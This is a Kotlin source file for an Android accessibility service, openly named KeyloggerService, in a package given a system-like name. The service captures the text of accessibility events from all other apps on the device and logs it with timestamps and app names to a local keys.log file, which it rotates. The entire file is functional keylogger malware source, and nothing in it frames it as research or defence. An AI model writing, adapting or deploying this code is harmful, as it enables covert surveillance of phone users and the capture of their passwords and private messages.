package com.sys.svc

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class KeyloggerService : AccessibilityService() {

    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private var logFile: File? = null
    private var lastText: String = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        Logger.init(this)
        logFile = File(filesDir, "keys.log")
        Logger.i("Key", "connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        val text = event.text?.joinToString(" ") ?: ""
        if (text.isBlank() || text == lastText) return
        lastText = text

        val f = logFile ?: return
        try {
            f.appendText("${fmt.format(Date())} [$pkg] $text\n")
            if (f.length() > 256 * 1024) {
                val bak = File(f.parentFile, f.name + ".old")
                bak.delete()
                f.renameTo(bak)
            }
        } catch (_: Exception) {}
    }

    override fun onInterrupt() {}

    companion object {
        fun isEnabled(ctx: Context): Boolean {
            val expected = ComponentName(ctx, KeyloggerService::class.java)
                .flattenToString()
            val enabled = Settings.Secure.getString(
                ctx.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return enabled.split(':').any { it.equals(expected, ignoreCase = true) }
        }
    }
}